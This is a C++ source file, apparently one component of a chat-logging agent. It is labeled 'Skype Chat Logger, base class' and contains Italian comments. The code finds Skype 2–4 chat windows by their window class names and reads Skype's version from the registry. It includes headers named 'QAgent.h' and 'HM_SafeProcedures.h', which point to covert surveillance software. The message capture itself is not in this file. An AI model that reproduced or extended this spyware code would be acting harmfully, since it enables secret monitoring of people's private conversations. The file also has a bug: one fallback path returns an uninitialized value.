/*
* Skype Chat Logger, base class
*
* Coded by: Quequero
* Date: 14/Mar/2008
*
*/

#include "QSkype.h"
#include "QAgent.h"
#include "..\HM_SafeProcedures.h"

QSkype::QSkype()
{
	hwChat = hwUserList = hwLogin = hwContacts = hwHistory = NULL;
}

BOOL QSkype::Is(HWND hw)
{
	UINT i = 0;
	WCHAR wClassName[256] = {0};
	WCHAR wTitle[256] = {0};

	PWCHAR pwClass[] = {
		L"TskMultiChatForm.UnicodeClass", // Non spostare queste righe, usiamo gli indici nel while()
		L"TConversationForm.UnicodeClass",
		0,
	};

	if(GetClassNameW(hw, wClassName, 256) == 0)
		return FALSE;

	while(pwClass[i]){
		if(!wcsncmp(pwClass[i], wClassName, wcslen(pwClass[i]))){
			HM_SafeGetWindowTextW(hw, wTitle, 256);
			
			// Skype 2/3
			if(i == 0 && wcsstr(wTitle, L"Skype™ Chat") != NULL)
				return TRUE;

			// Skype 4
			if(i == 1)
				return TRUE;

			return FALSE;
		}

		i++;
	};

	return FALSE;
}

UINT QSkype::Version(const HWND hw)
{
	UINT uVersion;
	BYTE bVersion;

	uVersion = VersionEx(NULL);
	bVersion = (BYTE)((uVersion & 0xff000000) >> 24);

	switch(bVersion){
		case 0x04:
			return SKYPE_4; // Skype 4 ha come major 0, mettiamo questo "case" come precauzione

		case 0x03:
			return SKYPE_3;

		case 0x02:
			return SKYPE_2;

		case 0x01:
			return SKYPE_1;

		case 0x00:
			return SKYPE_4; // Skype 4 ha come major 0, ma potrebbe essere un loro bug/dimenticanza

		default:
			return UNKNOWN_VERSION;
	}

	return UNKNOWN_VERSION;
}

// Skype: HKEY_CURRENT_USER\Software\Skype\Phone\UI\Version
UINT QSkype::VersionEx(const HWND hw)
{
	HKEY hKey;
	PWCHAR pwVer;
	DWORD dVersion, dSize;
	WCHAR wVersion[20] = {0}, wTmp[20] = {0};
	UINT uLen, uTmp, uVersion;

	if(RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Skype\\Phone\\UI", NULL, KEY_QUERY_VALUE, &hKey) != ERROR_SUCCESS)
		return UNKNOWN_VERSION;

	// Cerchiamo prima Version e poi VersionStr
	dSize = sizeof(DWORD);
	if(RegQueryValueExW(hKey, L"Version", NULL, NULL, (LPBYTE)&dVersion, &dSize) == ERROR_SUCCESS) {
		RegCloseKey(hKey);
		return (UINT)dVersion;
	}

	// Vediamo se e' presente VersionStr
	dSize = sizeof(wVersion);
	if(RegQueryValueExW(hKey, L"VersionStr", NULL, NULL, (LPBYTE)&wVersion, &dSize) == ERROR_SUCCESS){
		pwVer = wcschr(wVersion, '.');

		if(pwVer == NULL){
			RegCloseKey(hKey);
			return UNKNOWN_VERSION;
		}

		uLen = pwVer - wVersion;
		CopyMemory(wTmp, wVersion, uLen * sizeof(WCHAR));
		uTmp = _wtoi(wTmp);
		uVersion = uTmp << 24;

		pwVer++;
		pwVer = wcschr(pwVer, '.');

		if(pwVer == NULL){
			RegCloseKey(hKey);
			return UNKNOWN_VERSION;
		}

		uLen = pwVer - wVersion - uLen - 1;
		CopyMemory(wTmp, pwVer - uLen, uLen * sizeof(WCHAR));
		uTmp = _wtoi(wTmp);
		uVersion |= (uTmp << 16);

		RegCloseKey(hKey);
		return uVersion;
	}

	RegCloseKey(hKey);

	return (UINT)dVersion;
}

const PWCHAR QSkype::GetMessenger()
{ 
	return L"Skype"; 
}

